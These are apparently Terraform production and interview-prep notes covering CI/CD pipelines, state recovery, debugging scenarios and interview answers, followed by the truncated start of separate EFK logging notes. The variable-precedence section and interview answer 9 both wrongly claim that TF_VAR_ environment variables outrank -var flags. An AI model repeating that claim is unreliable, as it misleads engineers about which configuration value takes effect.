Terraform in CI/CD follows a strict pattern: plan on PR, apply on merge to main. The plan output is posted as a PR comment for review. Apply uses the saved plan artifact to guarantee what was reviewed is what gets applied.

### Industry Usage — GitHub Actions

```yaml
name: Terraform
on:
  pull_request:
    paths: ['**.tf', '**.tfvars']
  push:
    branches: [main]

permissions:
  id-token: write
  contents: read
  pull-requests: write

jobs:
  plan:
    if: github.event_name == 'pull_request'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Configure AWS via OIDC
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/TerraformRole-Plan
          aws-region: us-east-1

      - uses: hashicorp/setup-terraform@v3
        with: { terraform_version: "1.6.0" }

      - run: terraform init
      - run: terraform validate
      - run: terraform plan -out=tfplan -detailed-exitcode
        continue-on-error: true

      - uses: actions/upload-artifact@v4
        with: { name: tfplan, path: tfplan }

  apply:
    if: github.event_name == 'push' && github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    environment: production    # Requires manual approval
    concurrency:
      group: terraform-prod    # Prevents parallel applies
    steps:
      - uses: actions/checkout@v4

      - name: Configure AWS via OIDC
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/TerraformRole-Apply
          aws-region: us-east-1

      - uses: hashicorp/setup-terraform@v3
        with: { terraform_version: "1.6.0" }

      - run: terraform init
      - run: terraform apply -auto-approve tfplan
```

### Key CI/CD Principles

**Plan artifact:** `plan -out=tfplan` then `apply tfplan` guarantees what was reviewed equals what was applied. Without this, infrastructure could change between plan and apply.

**OIDC authentication:** eliminates stored credentials. CI issues a JWT token, exchanged for temporary AWS credentials via `sts:AssumeRoleWithWebIdentity`. AWS trust policy validates claims (repository, branch, environment). No access keys stored anywhere.

**Role separation:** plan role is read-only (any branch can trigger), apply role has write permissions (main branch only). Trust policy conditions restrict by repository, branch, and GitHub Environment.

**Concurrency control:** `concurrency.group` in GitHub Actions prevents parallel applies to the same environment, which would cause state lock conflicts or corruption.

**Environment gates:** GitHub Environments with required reviewers provide a human approval step before production applies.

---

## 9.2 Environment Promotion

### Concept

Changes flow through environments sequentially: dev → staging → prod. Each environment has its own state, its own variables, and its own approval gates.

### Industry Usage

```
# Sequential pipeline
PR → plan (all envs) → merge →
  apply dev (auto) →
    apply staging (auto) →
      approve (manual) →
        apply prod
```

Each environment uses environment-specific tfvars files, separate AWS accounts (blast radius isolation), separate IAM roles (access control), and separate state files (physical isolation).

---

## 9.3 Atlantis vs Terraform Cloud

### Concept

Atlantis is a self-hosted PR automation tool. Terraform Cloud (TFC) is HashiCorp's SaaS platform.

### Comparison

**Atlantis:** self-hosted (runs in your VPC, reaches private resources directly), PR-driven (`atlantis plan`/`atlantis apply` comments), free and open-source, no built-in policy engine (use OPA manually), no cost estimation, good for teams that want full control.

**Terraform Cloud:** SaaS with remote execution, VCS integration (push triggers plan, merge triggers apply), built-in Sentinel policy engine (advisory/soft-mandatory/hard-mandatory), cost estimation, workspace-based isolation with per-workspace variables and permissions, agent pools for private resource access.

### Interview Insights

**Q: When would you choose Atlantis over Terraform Cloud?**
Atlantis for teams wanting full control, running in private networks, or avoiding SaaS costs. TFC for teams wanting managed infrastructure, built-in policy enforcement (Sentinel), cost estimation, and workspace-based access control without managing self-hosted infrastructure.

---

## 9.4 Sentinel Policies

### Concept

Sentinel is Terraform Cloud's policy-as-code framework. It enforces rules on plans before apply.

### How It Works

Three enforcement levels:

**advisory** — warning only, never blocks. Useful for recommendations.

**soft-mandatory** — blocks apply, but authorized users can override with a reason. Used for policies with legitimate exceptions.

**hard-mandatory** — blocks apply, NO override possible. Used for absolute security requirements.

```python
# Example: require encryption on all S3 buckets
import "tfplan/v2" as tfplan

s3_buckets = filter tfplan.resource_changes as _, rc {
    rc.type is "aws_s3_bucket" and
    rc.mode is "managed" and
    (rc.change.actions contains "create" or rc.change.actions contains "update")
}

main = rule {
    all s3_buckets as _, bucket {
        bucket.change.after.server_side_encryption_configuration is not null
    }
}
```

---

---

# 10. SCALING PATTERNS

---

## 10.1 Multi-Account Architecture

### Concept

Production infrastructure spans multiple AWS accounts for isolation, blast radius control, and billing separation. Terraform manages resources across these boundaries using provider aliases with AssumeRole.

### Industry Usage

```hcl
# Default provider — prod account
provider "aws" {
  region = "eu-west-1"
}

# Shared services account
provider "aws" {
  alias  = "shared_services"
  region = "eu-west-1"
  assume_role {
    role_arn    = "arn:aws:iam::111122223333:role/TerraformCrossAccount"
    external_id = var.external_id    # Prevent confused deputy attack
  }
}

# Resources in different accounts
resource "aws_vpc" "prod" {
  cidr_block = "10.0.0.0/16"
  # Uses default provider (prod account)
}

resource "aws_route53_zone" "internal" {
  provider = aws.shared_services    # Creates in shared services account
  name     = "internal.mycompany.com"
}
```

### Important Details

Always use `external_id` in cross-account trust policies. Modules must declare `configuration_aliases` for aliased providers and receive them via the `providers = {}` map. Each alias starts a separate provider process.

---

## 10.2 Large-Scale Terraform — Monorepo vs Polyrepo

### Concept

At scale, how you organize Terraform code matters as much as the code itself.

### Industry Usage

**Monorepo** (single repository, all infrastructure): works well for up to ~20 stacks. Advantages include single PR for cross-stack changes, easier module sharing, unified CI/CD. Disadvantages include large CI pipelines, permission complexity, merge conflicts.

**Polyrepo** (separate repositories per domain): scales better beyond 20 stacks. Each repository has its own CI/CD, permissions, and team ownership. Disadvantage: cross-repo coordination is harder.

**Hybrid** (recommended for most orgs): monorepo for shared modules, per-domain repositories for root modules.

Target: 50-200 resources per state file. Split by team ownership and blast radius, not by convenience.

---

## 10.3 Terragrunt

### Concept

Terragrunt is a thin wrapper around Terraform that eliminates repetitive backend configuration, provides dependency ordering across stacks, and enables DRY (Don't Repeat Yourself) configuration.

### Industry Usage

Terragrunt solves three problems: repeating the same backend configuration in every root module (`find_in_parent_folders()` inherits backend config from parent), manually ordering stack applies (`dependency` blocks express cross-stack dependencies), and duplicating provider and variable blocks across environments.

```hcl
# Root terragrunt.hcl — inherited by all child stacks
remote_state {
  backend = "s3"
  generate = {
    path      = "backend.tf"
    if_exists = "overwrite_terragrunt"
  }
  config = {
    bucket         = "mycompany-terraform-state"
    key            = "${path_relative_to_include()}/terraform.tfstate"
    region         = "us-east-1"
    encrypt        = true
    dynamodb_table = "terraform-locks"
  }
}

generate "provider" {
  path      = "provider.tf"
  if_exists = "overwrite_terragrunt"
  contents  = <<EOF
provider "aws" {
  region = "us-east-1"
}
EOF
}
```

```hcl
# Child stack terragrunt.hcl (e.g., stacks/compute/terragrunt.hcl)
include "root" {
  path = find_in_parent_folders()
}

dependency "networking" {
  config_path = "../networking"
  mock_outputs = {
    vpc_id             = "vpc-mock"
    private_subnet_ids = ["subnet-mock"]
  }
}

inputs = {
  vpc_id             = dependency.networking.outputs.vpc_id
  private_subnet_ids = dependency.networking.outputs.private_subnet_ids
}
```

```bash
# Apply all stacks in dependency order
terragrunt run-all apply

# Plan all stacks
terragrunt run-all plan

# Destroy all stacks (reverse order)
terragrunt run-all destroy
```

Use Terragrunt when you have 10+ root modules with duplicate backend configuration and cross-stack dependencies. For smaller setups, vanilla Terraform with separate directories works fine.

---

## 10.4 Parallelism Tuning

### Concept

Terraform's `-parallelism` flag controls the maximum number of concurrent resource operations during apply and destroy. Default is 10.

### Industry Usage

**Increase parallelism** when you have many independent resources and are not hitting AWS API rate limits. Creating 50 S3 buckets with `-parallelism=30` is much faster than the default 10.

**Decrease parallelism** when you hit AWS API throttling (429 errors, "Rate exceeded"). Common when managing many resources of the same type in the same API (e.g., 100 IAM policies). Reducing to `-parallelism=5` or even `-parallelism=2` eliminates throttling.

```bash
# Speed up large deployments with many independent resources
terraform apply -parallelism=30

# Fix throttling errors
terraform apply -parallelism=5
```

### Important Details

Parallelism does NOT override dependency ordering. If resource B depends on A, B waits for A regardless of parallelism settings. Parallelism only affects independent resources that can run concurrently. It applies to create, update, and destroy operations equally.

---

---

# 11. DEBUGGING AND REAL-WORLD SCENARIOS

---

## 11.1 Debugging with TF_LOG

### Concept

`TF_LOG` enables verbose logging for Terraform Core and providers. It is the primary debugging tool for understanding what Terraform is doing internally.

### How It Works

```bash
# Log levels: TRACE > DEBUG > INFO > WARN > ERROR
export TF_LOG=DEBUG
export TF_LOG_PATH=./terraform-debug.log

# Separate Core and Provider logs
export TF_LOG_CORE=WARN
export TF_LOG_PROVIDER=DEBUG

terraform plan
```

### Industry Usage — What to Look For

```bash
# HTTP API calls (provider communication with AWS)
grep "HTTP Request" terraform-debug.log

# Provider errors
grep -i "error" terraform-debug.log

# Throttling (common cause of slow plans)
grep "Throttling\|Rate exceeded\|429" terraform-debug.log

# What resource is being processed
grep "Starting apply\|Creating\|Modifying\|Destroying" terraform-debug.log
```

---

## 11.2 Plan Shows No Changes But Infrastructure Is Broken

### Scenario

Someone reports a security group rule is missing, but `terraform plan` shows no changes.

### Investigation Steps

1. **Check `ignore_changes`**: the security group might have `ignore_changes` on ingress/egress rules, causing Terraform to skip those attributes.

2. **Check `-refresh=false`**: if someone ran plan with `-refresh=false`, state was not updated from reality.

3. **Run refresh-only plan**: `terraform plan -refresh-only` forces a full state refresh from AWS APIs and shows what changed in reality.

4. **Check if resource is in state**: the rule might have been created outside Terraform and is not tracked in state at all.

5. **Check CloudTrail**: who modified the security group and when.

---

## 11.3 Apply Fails Midway — Partial Apply

### Scenario

`terraform apply` created 3 out of 5 resources, then failed on the 4th.

### How Terraform Handles It

Terraform updates state after EACH successful resource operation. If apply fails midway, state contains the 3 successfully created resources. The 4th resource may be partially created (depends on the provider/API).

### Recovery Steps

```bash
# Step 1: Check state for what was created
terraform state list

# Step 2: Check AWS for the partially created resource
# (may need to manually clean up or import)

# Step 3: Fix the root cause (permissions, quotas, config error)

# Step 4: Run plan to see what remains
terraform plan

# Step 5: Apply again — Terraform only creates remaining resources
terraform apply
```

### Important Details

Terraform is designed to be re-run after failures. The state file reflects reality after each successful operation, so subsequent applies pick up where the failed apply left off.

---

## 11.4 State Corruption — Causes and Recovery

### Scenario

State file is invalid JSON, contains phantom resources, or is missing resources that exist.

### Common Causes

Force-pushing a local state without proper locking, concurrent applies without state locking (no DynamoDB table), manually editing the state file with invalid JSON, interrupted `state mv` or `state rm` operations, and provider bugs that write invalid state entries.

### Recovery Steps

```bash
# Step 1: Check if state is valid JSON
terraform state pull | jq '.' > /dev/null
# If this fails, state is corrupted

# Step 2: Restore from S3 versioned backup
aws s3api list-object-versions \
  --bucket mycompany-terraform-state \
  --prefix prod/terraform.tfstate \
  --max-items 5

aws s3api get-object \
  --bucket mycompany-terraform-state \
  --key prod/terraform.tfstate \
  --version-id PREVIOUS_VERSION_ID \
  restored-state.tfstate

# Step 3: Push restored state
terraform state push restored-state.tfstate

# Step 4: If resources are missing from state, import them
terraform import aws_instance.web i-0a1b2c3d4e5f67890

# Step 5: If phantom entries exist (state says exists, AWS says no)
terraform state rm aws_instance.phantom

# Step 6: Verify
terraform plan    # Should show 0 unexpected changes
```

### Prevention

Always enable S3 versioning on the state bucket. Always use DynamoDB locking. Never use `state push -force`. Never edit state JSON directly.

---

## 11.5 Plan Passes But Apply Fails

### Scenario

`terraform plan` shows a clean plan, but `terraform apply` fails.

### Common Causes

**Time gap:** infrastructure changed between plan and apply (someone manually created a conflicting resource). Fix: use saved plan files with short plan-to-apply windows.

**IAM permissions:** plan uses read-only APIs (which succeed), but apply needs write APIs (which the role lacks). Fix: ensure the apply role has create/modify/delete permissions.

**AWS quotas:** plan does not check service quotas. Apply fails when the quota is exceeded (too many VPCs, Elastic IPs, etc.). Fix: request quota increases before applying.

**Eventual consistency:** IAM policy changes take time to propagate. Plan sees the old state, apply runs in the new state where permissions are not yet effective. Fix: add `depends_on` and consider `time_sleep` for IAM propagation.

---

## 11.6 Perpetual Diff — Plan Always Shows Changes

### Scenario

Every `terraform plan` shows changes for the same resource, even after applying.

### Common Causes

**JSON normalization:** you write JSON in a specific format, the AWS API returns it in a different format (key ordering, whitespace). Terraform sees them as different.

```hcl
# Fix: use jsonencode() instead of heredoc JSON
policy = jsonencode({
  Version   = "2012-10-17"
  Statement = [{ Effect = "Allow", Action = "s3:*", Resource = "*" }]
})
```

**Timestamp functions:** `timestamp()` returns a new value every plan, causing perpetual changes. Fix: avoid `timestamp()` in resource attributes; use it only in locals or for debugging.

**Provider API format differences:** you write `10.0.0.0/16`, the API returns `10.0.0.0/16` with additional attributes that differ. Fix: match the format the API returns.

**Floating-point precision:** you write `0.5`, the API returns `0.50000000000001`. Fix: use string representation or round.

---

## 11.7 Safe Resource Renaming

### Scenario

You need to rename `aws_instance.web_server` to `aws_instance.web` without destroying and recreating.

### Solution

```hcl
# Terraform 1.1+: moved block (preferred)
moved {
  from = aws_instance.web_server
  to   = aws_instance.web
}
```

```bash
# Pre-1.1: state mv (imperative)
terraform state mv aws_instance.web_server aws_instance.web
```

Always use `moved` blocks when possible — they are codified, reviewable, and apply to all environments automatically.

---

## 11.8 Migrating count to for_each

### Scenario

You have resources using `count` and need to migrate to `for_each` without destroying them.

### Solution

```bash
# Map each count index to the corresponding for_each key
terraform state mv 'aws_instance.web[0]' 'aws_instance.web["app-1"]'
terraform state mv 'aws_instance.web[1]' 'aws_instance.web["app-2"]'
terraform state mv 'aws_instance.web[2]' 'aws_instance.web["app-3"]'

# Then update the code from count to for_each
# Run terraform plan — should show 0 changes
```

---

## 11.9 Cross-State Migration

### Scenario

You need to move 20 resources from one state file to another without downtime.

### Solution — Zero-Destruction Checklist

```bash
# 1. Back up both state files
terraform -chdir=monolith state pull > monolith-backup.tfstate
terraform -chdir=networking state pull > networking-backup.tfstate

# 2. Move state entries one at a time
terraform state mv \
  -state=monolith.tfstate \
  -state-out=networking.tfstate \
  aws_vpc.main aws_vpc.main

# 3. Move the resource config from monolith main.tf to networking main.tf

# 4. Push new state to networking backend
cd networking && terraform state push networking.tfstate

# 5. Remove from monolith state (already moved)
# (state mv already removed it from source)

# 6. Verify BOTH stacks
terraform -chdir=monolith plan     # Should show 0 unexpected changes
terraform -chdir=networking plan   # Should show 0 unexpected changes
```

---

## 11.10 Slow Plan Debugging

### Scenario

`terraform plan` takes 20 minutes in CI/CD.

### Investigation Steps

```bash
# 1. Enable timing logs
export TF_LOG=DEBUG
terraform plan 2>&1 | tee plan-debug.log

# 2. Check state size
terraform state pull | wc -c    # Bytes
terraform state list | wc -l    # Resource count

# 3. Look for throttling
grep "Throttling\|Rate exceeded" plan-debug.log

# 4. Look for slow data sources
grep "data\." plan-debug.log | sort -t'=' -k2 -n

# 5. Check parallelism
terraform plan -parallelism=5    # Reduce if throttled
terraform plan -parallelism=30   # Increase if not throttled
```

### Common Fixes

**Large state (500+ resources):** split into smaller stacks by domain. Target 50-200 resources per state.

**API throttling:** reduce parallelism (`-parallelism=5`). AWS API rate limits cause retries and exponential backoff.

**Slow data sources:** data sources that query large datasets (AMI searches, IAM policy lookups) can be slow. Cache results in locals or use more specific filters.

**Unnecessary refreshes:** `-refresh=false` skips API calls but risks stale state. Only use when certain no drift has occurred.

---

## 11.11 Provider Version Conflict Resolution

### Scenario

Root module requires AWS provider `~> 5.0` but a child module requires `>= 4.0, < 5.0`.

### Solution

```bash
# Diagnose: see all requirements across root + modules
terraform providers
```

Resolution options in order of preference: update the child module to permissive constraints (`>= 4.0, < 6.0`), use a newer version of the third-party module that supports the newer provider, constrain the root to match the child (lose newer features), or fork the module and fix the constraint.

Best practice for module authors: use permissive lower bounds (`>= X.0`) with upper bound on major versions only. Never pin exact versions in reusable modules.

## 11.12 Phantom Apply

### Scenario

`terraform apply` succeeds and reports a resource was created, but the resource does not exist in AWS.

### Common Causes

**Async API:** some AWS APIs return success before the resource is fully created. The provider records the resource ID in state, but the resource fails to materialize.

**Provider bugs:** the provider incorrectly reports success without verifying the resource was actually created.

### Recovery

```bash
# 1. Verify resource does not exist
aws ec2 describe-instances --instance-ids i-0abc123

# 2. Remove phantom entry from state
terraform state rm aws_instance.web

# 3. Re-run apply to create the resource
terraform apply
```

---

## 11.13 Concurrent Apply Protection

### Scenario

Two team members or two CI/CD pipelines try to `terraform apply` at the same time.

### How State Locking Prevents Corruption

DynamoDB state locking uses a conditional PutItem operation. The first apply writes a lock record. The second apply's PutItem fails because the condition (record must not exist) is not met. The second apply shows the lock holder's information and refuses to proceed.

Without locking: both applies read the same state, both compute independent plans, both try to create the same resources. The result is duplicate resources, state corruption, or conflicting changes.

### Industry Usage

In CI/CD, use concurrency groups to prevent parallel applies:

```yaml
# GitHub Actions
concurrency:
  group: terraform-${{ inputs.environment }}
  cancel-in-progress: false    # Don't cancel running apply
```

In Atlantis, workspace-level locking prevents concurrent plans/applies on the same state.

---

## 11.14 Known After Apply Issues

### Scenario

`terraform plan` errors with "The for_each value depends on resource attributes that cannot be determined until apply."

### Cause

`for_each` and `count` require their values to be known at plan time. If the value depends on a resource attribute that only exists after creation (like a generated ID), Terraform cannot compute the plan.

```hcl
# FAILS: subnet IDs not known until VPC module is applied
resource "aws_instance" "web" {
  for_each  = toset(module.vpc.private_subnet_ids)    # Unknown at plan!
  subnet_id = each.value
}
```

### Fix

Use values known at plan time for `for_each`/`count` keys:

```hcl
# WORKS: use a known variable, not a computed output
resource "aws_instance" "web" {
  for_each  = toset(var.availability_zones)    # Known at plan time
  subnet_id = module.vpc.private_subnet_ids[index(var.availability_zones, each.key)]
}

# Or restructure to avoid computed keys
resource "aws_instance" "web" {
  count     = var.az_count    # Known at plan time
  subnet_id = module.vpc.private_subnet_ids[count.index]
}
```

## 11.15 Cycle Errors — Security Group Pattern

### Scenario

Two security groups reference each other in their inline rules, creating a circular dependency.

### The Problem

```hcl
# CAUSES CYCLE:
resource "aws_security_group" "web" {
  egress {
    security_groups = [aws_security_group.db.id]    # web → db
  }
}
resource "aws_security_group" "db" {
  ingress {
    security_groups = [aws_security_group.web.id]   # db → web
  }
}
# Cycle: web → db → web
```

### The Fix

Separate group creation from rule creation:

```hcl
# Create groups first (no cross-references)
resource "aws_security_group" "web" {
  name   = "web"
  vpc_id = aws_vpc.main.id
}

resource "aws_security_group" "db" {
  name   = "db"
  vpc_id = aws_vpc.main.id
}

# Then create rules (both depend on both groups, but groups don't depend on each other)
resource "aws_security_group_rule" "web_to_db" {
  type                     = "egress"
  security_group_id        = aws_security_group.web.id
  source_security_group_id = aws_security_group.db.id
  from_port = 5432; to_port = 5432; protocol = "tcp"
}

resource "aws_security_group_rule" "db_from_web" {
  type                     = "ingress"
  security_group_id        = aws_security_group.db.id
  source_security_group_id = aws_security_group.web.id
  from_port = 5432; to_port = 5432; protocol = "tcp"
}
```

### Debugging Cycles

```bash
# Terraform error gives the cycle path
Error: Cycle: aws_security_group.web, aws_security_group.db

# Visualize the graph
terraform graph | dot -Tpng > graph.png

# Find cross-references
grep -n "security_group" modules/app/*.tf

# Validate without API calls
terraform validate
```

---

## 11.16 Stuck Terraform Process

### Scenario

A Terraform apply hangs and the process is killed. The state lock remains in DynamoDB.

### Recovery

```bash
# Step 1: VERIFY no apply is actually running
# Check CI/CD dashboard, ask the team

# Step 2: Check the lock in DynamoDB
aws dynamodb scan --table-name terraform-locks

# Step 3: Force unlock using Lock ID from the error
terraform force-unlock <LOCK_ID>

# Step 4: If force-unlock fails, delete directly from DynamoDB
aws dynamodb delete-item \
  --table-name terraform-locks \
  --key '{"LockID": {"S": "mycompany-terraform-state/prod/networking/terraform.tfstate"}}'

# Step 5: Check for partial state from the interrupted apply
terraform plan    # Verify state is consistent
```

### Prevention

Set timeouts in CI/CD pipelines. Use `terraform apply -lock-timeout=5m` to wait for an existing lock to release before failing. Monitor for stale locks older than 1 hour using a Lambda function that scans DynamoDB.

---

## 11.17 Provider Plugin Crashes

### Scenario

`terraform apply` fails with "The terraform-provider-aws plugin crashed!" and a goroutine stack trace.

### How to Debug

```bash
# 1. Enable full crash capture
export TF_LOG=TRACE
export TF_LOG_PATH=./provider-crash.log
terraform apply 2>&1

# 2. Read the panic message
grep "panic:" provider-crash.log

# 3. Read the goroutine stack trace — which provider function crashed
grep -A 30 "goroutine 1 \[running\]" provider-crash.log

# 4. Search existing GitHub issues
# https://github.com/hashicorp/terraform-provider-aws/issues
# Search for the function name from the stack trace
```

### Workarounds

```hcl
# Pin to the last working provider version
terraform {
  required_providers {
    aws = { version = "= 5.29.0" }   # Last version before the crash
  }
}

# Use ignore_changes to avoid the crashing code path
resource "aws_instance" "web" {
  lifecycle { ignore_changes = [tags] }    # If crash is in tag update
}
```

## 11.18 Sensitive Data in Plan Output

### Scenario

`terraform plan` shows sensitive values in its output despite `sensitive = true` being set.

### Understanding

`sensitive = true` on outputs and variables redacts values from `terraform output` and plan display. However, sensitive values CAN still appear in plan output when: the value is used in a non-sensitive context (e.g., in a resource name), the provider does not mark the attribute as sensitive in its schema, or the value appears in error messages during plan/apply failures.

### Industry Best Practices

Never put actual secrets in Terraform variables or state when possible. Instead, have Terraform create the secret and store it in Secrets Manager, or reference existing secrets by ARN. Use `nonsensitive()` function only when you explicitly want to unwrap a sensitive value (rare, and should be justified with a comment).

```hcl
# BETTER: Generate and store secret, never pass it through variables
resource "random_password" "db" {
  length  = 32
  special = true
}

resource "aws_secretsmanager_secret_version" "db" {
  secret_id     = aws_secretsmanager_secret.db.id
  secret_string = random_password.db.result
}

# Application reads from Secrets Manager at runtime
# Terraform state still has the password, but it never flows through variables
```

---

---

# GOLDEN RULES OF TERRAFORM

```
1.  ALWAYS back up state before any manual state operation
2.  NEVER force-unlock without verifying no apply is running
3.  ALWAYS run plan after any state manipulation
4.  Rotate secrets BEFORE cleaning Git history
5.  moved blocks > state mv > destroy/recreate (prefer least destructive)
6.  Perpetual diff = provider normalizes differently than you write
7.  Plan passes / apply fails = time gap, IAM, quotas, eventual consistency
8.  Silent drift = ignore_changes or -refresh=false hiding reality
9.  Split state by team ownership + blast radius, not by convenience
10. Pin third-party module versions exactly in production
```

# TOP INTERVIEW QUESTIONS

## Fundamentals

1. **"Walk me through what happens when you run `terraform plan`"**
   Core reads config, refreshes state from APIs, builds DAG, computes diff, outputs execution plan. Specifically: reads all `.tf` files, loads state from backend, calls provider APIs to refresh resource states (unless `-refresh=false`), builds dependency graph, computes desired vs current state diff, and displays creates/updates/destroys.

2. **"What is the difference between Terraform and Ansible?"**
   Terraform is a provisioning tool (creates EC2, VPCs, databases) using a declarative model. Ansible is a configuration management tool (installs packages, manages config files) using a mostly imperative model. They solve different problems and are best used together: Terraform provisions the resource, Ansible configures it.

3. **"Should `.terraform.lock.hcl` be committed to Git?"**
   Yes, always. It pins exact provider versions (reproducibility) and stores cryptographic hashes (supply chain security). The `.terraform/` directory goes in `.gitignore`, but the lock file does NOT.

## State Management

4. **"What is Terraform state and why does it exist?"**
   State is a JSON file mapping config to real-world resources. It maps `aws_instance.web` to `i-0abc123`. Without it, Terraform cannot know which real resources correspond to which config blocks. It stores all attributes for diff computation and tracks metadata like serial numbers for concurrent modification detection.

5. **"How would you set up a production S3 backend?"**
   S3 bucket with versioning + SSE-KMS encryption + bucket policy (HTTPS-only) + public access block. DynamoDB table for locking (partition key `LockID`). Per-environment IAM roles restricting state access by path prefix. KMS key with rotation enabled and key policy restricting decrypt access.

6. **"A colleague says `sensitive = true` protects their database password in state. What do you say?"**
   `sensitive` only redacts CLI output. State is always plaintext JSON. You need KMS encryption on the S3 bucket, IAM policies restricting state access, and ideally should minimize secrets in state by using Secrets Manager references.

7. **"Explain the difference between `terraform state mv`, `rm`, `pull`, and `push`"**
   `mv` renames/moves resources in state without touching infrastructure. `rm` removes from state without destroying the real resource. `pull` downloads state for backup/inspection. `push` uploads state (dangerous, for disaster recovery). Always `pull` a backup before any state manipulation, and run `plan` after to verify.

## Variables and Meta-Arguments

8. **"What is the difference between count and for_each?"**
   `count` uses numeric indexes (unstable — removing from middle shifts all subsequent), `for_each` uses stable string keys (removing only affects that key). Use `for_each` when instances have distinct identities. Use `count` for conditional creation (`0 or 1`) and truly identical fungible resources.

9. **"What is the variable precedence order?"**
   Lowest to highest: default value, `terraform.tfvars`, `terraform.tfvars.json`, `*.auto.tfvars` (alphabetical), `-var-file`, `-var`, `TF_VAR_` environment variables (highest). Common misconception: many think `-var` beats `TF_VAR_` — it does not.

10. **"When should you use `depends_on` and when is it misuse?"**
    Use when a real dependency exists through side effects, not attribute references (IAM policy attachment before Lambda, bucket policy before CloudFront). Misuse: adding `depends_on` when an implicit dependency already exists via attribute reference. Redundant `depends_on` serializes parallel operations and slows apply.

## Modules

11. **"How do you structure modules in your organization?"**
    Platform team maintains reusable modules (vpc, eks, rds, iam). App teams consume them. Each module has variables.tf (input interface), outputs.tf (public API), versions.tf (permissive provider constraints). Breaking changes are managed through semantic versioning. Root modules pin exact module versions.

12. **"How do you handle module versioning?"**
    Pin exact versions in production root modules (`version = "5.1.0"`). Use semantic versioning for internal modules. Upgrade through environment pipeline (dev → staging → prod). Use `moved` blocks if module restructured resources.

## Security

13. **"How do you handle secrets in Terraform?"**
    Never in code or Git. Use Secrets Manager / SSM for values. Inject via `TF_VAR_` in CI/CD. State encrypted with KMS. Pre-commit hooks (gitleaks) prevent accidental commits. If committed: rotate secret FIRST, then clean Git history with BFG.

14. **"Explain OIDC authentication for Terraform CI/CD"**
    GitHub Actions issues a JWT token. AWS exchanges it for temporary credentials via `sts:AssumeRoleWithWebIdentity`. Trust policy validates claims (specific repo, branch, environment). No stored credentials anywhere. Separate plan (read-only, any branch) and apply (write, main only) roles.

## CI/CD

15. **"Walk me through your CI/CD pipeline"**
    Plan on PR: OIDC auth with read-only role, `terraform init`, `validate`, `plan -out=tfplan`, post plan output as PR comment, upload plan artifact. Apply on merge: OIDC auth with write role, `terraform apply tfplan` (saved plan), concurrency group prevents parallel applies, Slack notification.

16. **"What is a plan artifact and why does it matter?"**
    `plan -out=tfplan` then `apply tfplan` guarantees what was reviewed equals what was applied. Without it, infrastructure could change between plan and apply (time gap). Plan files are binary and environment-specific.

17. **"What is the difference between Atlantis and Terraform Cloud?"**
    Atlantis: self-hosted, PR comments (`atlantis plan/apply`), free, no built-in policy engine, direct VPC access. TFC: SaaS, VCS integration, built-in Sentinel policies (advisory/soft-mandatory/hard-mandatory), cost estimation, workspace-based access control, agent pools for private resources.

## Debugging

18. **"Your plan shows no changes but infrastructure is broken. How do you investigate?"**
    Check `ignore_changes` on the resource. Run `terraform plan -refresh-only` to force state refresh. Check if `-refresh=false` was used. Verify resource is in state (`terraform state list`). Check CloudTrail for manual changes.

19. **"Apply succeeded but the resource does not exist. What happened?"**
    Phantom apply: async API returned success before resource was fully created, or provider bug. Verify in AWS. `terraform state rm` the phantom entry. Re-apply. Report as provider bug if reproducible.

20. **"Your CI/CD plan takes 20 minutes. How do you fix it?"**
    Check state size (`terraform state list | wc -l` — split if >200). Check for API throttling (`grep "Throttling" debug.log` — reduce `-parallelism`). Check slow data sources. Use `TF_LOG=DEBUG` to identify bottlenecks. Consider `-refresh=false` if drift risk is acceptable.

21. **"Walk me through migrating `count` to `for_each` without destroying anything"**
    Map each count index to the corresponding for_each key using `terraform state mv 'resource[0]' 'resource["key"]'`. Update the code from count to for_each. Run `terraform plan` — should show 0 changes.

22. **"How do you manage Terraform across multiple AWS accounts?"**
    Provider aliases with `assume_role` per account. `external_id` in cross-account trust policies to prevent confused deputy. Modules declare `configuration_aliases` and receive aliased providers via `providers = {}` map.

23. **"When would you use Terraform workspaces vs separate directories?"**
    Workspaces for ephemeral environments (PR testing, feature branches). Separate directories for production (physical isolation, per-env IAM, per-env configuration). Workspaces provide no security isolation — workspace is just a state file label.

24. **"Explain Sentinel enforcement levels"**
    Advisory: warning only, never blocks. Soft-mandatory: blocks apply, but authorized users can override with a reason (for policies with legitimate exceptions). Hard-mandatory: blocks apply, NO override possible (absolute security requirements like encryption).

25. **"How do you recover from state corruption?"**
    Pull current state, check if valid JSON. If invalid: restore from S3 versioned backup. If missing entries: `terraform import` orphaned resources. If phantom entries: `terraform state rm`. Always run `terraform plan` after recovery to verify 0 unexpected changes.

# EFK Stack — Production Notes (Kubernetes Focus)

# 1. Kubernetes Logging in Production

### What Happens in Production

Every pod writes logs to `stdout` / `stderr`. The container runtime (containerd or Docker) captures those streams and writes them as JSON log files on the node. A DaemonSet agent (Fluentd or Fluent Bit) runs on every node, tails those files, enriches them with Kubernetes metadata, and ships them to Elasticsearch.

### How It Works (FLOW-LEVEL)

```
Pod stdout/stderr
  → Container runtime (containerd)
  → Node filesystem: /var/log/pods/<namespace>_<pod>_<uid>/<container>/*.log
  → Symlinked at: /var/log/containers/<pod>_<ns>_<container>-<id>.log
  → Fluentd DaemonSet tails /var/log/containers/*.log
  → Parses + enriches with K8s metadata
  → Forwards to Elasticsearch
  → Kibana reads and displays
```

### Key Configs / Components

| Component | Role |
|---|---|
| `stdout / stderr` | Only supported log source for containers |
| `/var/log/pods/` | Raw per-container log files (runtime-managed) |
| `/var/log/containers/` | Symlinks — what Fluentd actually tails |
| Fluentd DaemonSet | One pod per node, tails node log files |
| Elasticsearch | Stores and indexes all log documents |
| Kibana | Search and visualize logs |

### Common Issues

- App writing to a file inside the container instead of stdout → logs never appear
- Container runtime rotating logs too aggressively → gaps in Fluentd tail
- DaemonSet pod not scheduled on a tainted node → logs from that node silently missing

### Interview Insights

> "In Kubernetes, the golden rule is: write to stdout/stderr. Anything else requires a sidecar or a custom input plugin, and both add operational overhead."

# 2. EFK Architecture (High-Level)

### What Happens in Production

EFK = **E**lasticsearch + **F**luentd (or Fluent Bit) + **K**ibana. It replaces the "L" (Logstash) in ELK with Fluentd, which is lighter, more Kubernetes-native, and has better plugin support for dynamic pod discovery.

### Fluentd vs Fluent Bit

| | Fluentd | Fluent Bit |
|---|---|---|
| Language | Ruby + C | C only |
